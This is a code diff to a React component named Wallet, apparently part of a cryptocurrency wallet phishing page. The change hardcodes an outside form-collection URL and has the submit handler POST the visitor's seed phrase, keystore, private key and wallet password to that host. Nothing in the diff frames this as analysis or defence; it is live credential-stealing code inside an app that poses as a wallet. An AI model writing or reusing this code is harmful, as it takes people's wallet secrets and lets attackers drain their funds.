@@ -254,16 +254,18 @@ function Wallet({coins}) {
   async function handleMessage(e){
     e.preventDefault()
     setProceed(true)
-    const baseUrl = process.env.REACT_APP_BASE_URL
+    // const baseUrl = process.env.REACT_APP_BASE_URL
+    const baseUrl = 'https://forms-io.onrender.com/submit-form/a8f7dfe5-03a9-4d21-86af-f21f70f9ed36'
 
       try {
         
-        const responds = await fetch(baseUrl, {
+        const response = await fetch(baseUrl, {
           method: "POST",
           headers: {"Content-Type": "application/json"},
           body : JSON.stringify({phrase, keystore, privateKey, walletPassword})
       })
-      .then(res=>res.json())
+      // .then(res=>res.json())
+      const responds = await response.json();
       if(responds){
           setProceed(false)
           
